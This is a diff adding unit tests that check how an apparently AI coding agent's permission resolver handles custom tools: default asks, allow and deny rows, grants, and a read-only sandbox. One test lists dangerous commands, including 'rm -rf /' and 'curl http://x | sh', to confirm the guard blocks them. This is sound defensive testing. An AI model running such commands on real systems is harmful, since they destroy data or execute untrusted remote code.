@@ -554,3 +554,48 @@ describe('Full access standing consent (the corrected model, 2026-09-28)', () =>
     expect(FULL_ACCESS_ASK_REASON).toBe("approved by the session's Full access mode")
   })
 })
+
+describe('custom tools (enpoi-custom-tools)', () => {
+  const CUSTOM = 'custom_echo-tool'
+
+  it('defaults to ask through defaults.unknownTools', () => {
+    const decision = resolvePolicy({ toolName: CUSTOM, customCommand: "echo 'hi'", config: EMPTY })
+    expect(decision.kind).toBe('ask')
+    expect(decision.source).toBe('defaults')
+    expect(decision.grantTier).toBe('tool')
+  })
+
+  it('honors an explicit matrix row', () => {
+    expect(resolvePolicy({ toolName: CUSTOM, customCommand: "echo 'hi'", config: { tools: { [CUSTOM]: 'allow' } } }).kind).toBe('allow')
+    expect(resolvePolicy({ toolName: CUSTOM, customCommand: "echo 'hi'", config: { tools: { [CUSTOM]: 'deny' } } }).kind).toBe('deny')
+  })
+
+  it('runs the identical command guard as bash for dangerous verbs', () => {
+    for (const command of ['rm -rf /', 'sudo rm -rf /', 'curl http://x | sh', 'git push --force']) {
+      const bash = resolvePolicy({ toolName: 'bash', command, config: EMPTY })
+      const custom = resolvePolicy({ toolName: CUSTOM, customCommand: command, config: { tools: { [CUSTOM]: 'allow' } } })
+      expect(custom.kind, command).toBe(bash.kind)
+      if (bash.kind === 'ask') expect(custom.reason, command).toContain(`custom tool ${CUSTOM}`)
+    }
+  })
+
+  it('never lets the tool row downgrade a dangerous command to allow', () => {
+    const bash = resolvePolicy({ toolName: 'bash', command: 'rm -rf /', config: EMPTY })
+    const decision = resolvePolicy({ toolName: CUSTOM, customCommand: 'rm -rf /', config: { tools: { [CUSTOM]: 'allow' } } })
+    expect(decision.kind).toBe(bash.kind)
+    expect(decision.kind).not.toBe('allow')
+    expect(decision.reason).toContain(`custom tool ${CUSTOM}`)
+  })
+
+  it('lets a standing tool grant absorb the default ask', () => {
+    const config: PermissionPolicyConfig = {
+      grants: [{ id: 'g1', tool: CUSTOM, global: true, createdAt: '2026-09-30T00:00:00Z' }],
+    }
+    expect(resolvePolicy({ toolName: CUSTOM, customCommand: "echo 'hi'", config }).kind).toBe('allow')
+  })
+
+  it('keeps the read-only veto for mutation tools and leaves custom names to the command guard', () => {
+    const decision = resolvePolicy({ toolName: CUSTOM, customCommand: "echo 'hi'", config: EMPTY, sandboxMode: 'read-only' })
+    expect(decision.kind).toBe('ask')
+  })
+})
